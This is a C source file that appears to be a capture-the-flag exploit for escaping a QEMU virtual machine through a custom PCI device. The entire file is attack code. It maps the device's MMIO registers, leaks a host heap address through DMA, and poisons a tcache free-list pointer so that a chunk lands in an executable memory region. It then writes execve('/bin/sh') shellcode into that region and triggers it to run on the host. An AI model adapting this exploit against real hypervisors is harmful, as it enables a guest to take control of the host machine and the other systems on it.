#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdarg.h>

#define PAUSE scanf("%*c");

/*
lspci
cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
febf1000-febf1fff
*/

unsigned int mmio_addr = 0xfebf1000;
unsigned int mmio_size = 0x1000;
char* mmio = 0;
char *va, *result_va;


void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}


void set_FunState_addr( int val )
{
    *(uint32_t*)&mmio[0x4] = val;
}

void set_FunState_size( int val )
{
    *(uint32_t*)&mmio[0x0] = val;
}

void set_FunState_idx( int val )
{
    *(uint32_t*)&mmio[0xc] = val;
}

void set_FunState_result_addr( int val )
{
    *(uint32_t*)&mmio[0x8] = val;
}

void trigger_handle_data_read()
{
    *(int*)&mmio[0x10] = 0;
}

void trigger_create_req()
{
    *(int*)&mmio[0x14] = 0;
}

void trigger_delete_req()
{
    *(int*)&mmio[0x18] = 0;
}

uint32_t read_addr()
{
    return *(uint32_t*)&mmio[0x4];
}

uint32_t read_size()
{
    return *(uint32_t*)&mmio[0x0];
}

uint32_t read_idx()
{
    return *(uint32_t*)&mmio[0xc];
}

uint32_t read_result_addr()
{
    return *(uint32_t*)&mmio[0x8];
}

uint32_t trigger_handle_data_write()
{
    return *(uint32_t*)&mmio[0x10];
}


void print_state(){
    puts("-------------------------------");
    printf( "addr -> 0x%x\nsize -> 0x%x\nidx -> 0x%x\nresult_addr -> 0x%x\n" , read_addr() , read_size() , read_idx() , read_result_addr() );
    puts("-------------------------------");
}


size_t *leak_buf;
void print_leak(int j){
    for(int i = 0 ; i < j ; ++i) printf("%d: %p\n" , i , leak_buf[i]);
}


int main(int argc,char** argv){

    // prepare PCI stuff
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1) die("open");

    mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio == MAP_FAILED) die("mmap");

    va = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    mlock(va, 0x1000);
    result_va = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mlock(result_va, 0x1000);


    // leak qemu heap
    set_FunState_size( 1 << 10 );
    trigger_create_req();

    set_FunState_addr( virt2phys(va) );
    set_FunState_idx(0);
    set_FunState_result_addr( virt2phys(result_va) );

    trigger_handle_data_write();

    leak_buf = va;
    //print_leak(0x10);
    uint64_t dma_base = (leak_buf[0] & 0xfffffffffff00000) + 0x7e00000;
    uint64_t rxw = dma_base + 0x4200000;
    printf( "[+] dma_base(PA) = %p\n"  , dma_base );
    printf( "[+] rxw = %p\n"  , rxw );


    // overwrite tcache fd to rxw address
    size_t *ptr = va;
    //for( int i = 0 ; i < 0x400 / 8 ; ++i ){
    //    ptr[i] = 0x777000 + i;
    //}
    //ptr[0x4f] = 0x8888888;      // tcache 0x410
    //ptr[0x67] = rxw + 0x16;              // rip

    ptr[0] = rxw + 0x2c;

    set_FunState_addr( virt2phys(va) - (1<<10) );
    set_FunState_idx(1);
    set_FunState_result_addr( (size_t)mmio_addr+0x18 );
    trigger_handle_data_read();


    // get rxw chunk in FunReq
    set_FunState_size( 1 << 10 );
    trigger_create_req();


    // place shellcode
    char *sc = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05";
    memcpy( va , sc , 0x100 );

    set_FunState_addr( virt2phys(va) - (1<<10) );
    set_FunState_idx(1);
    set_FunState_result_addr( virt2phys(result_va) );


    //PAUSE
    // write shellcode and trigger it
    trigger_handle_data_read();

    return 0;
}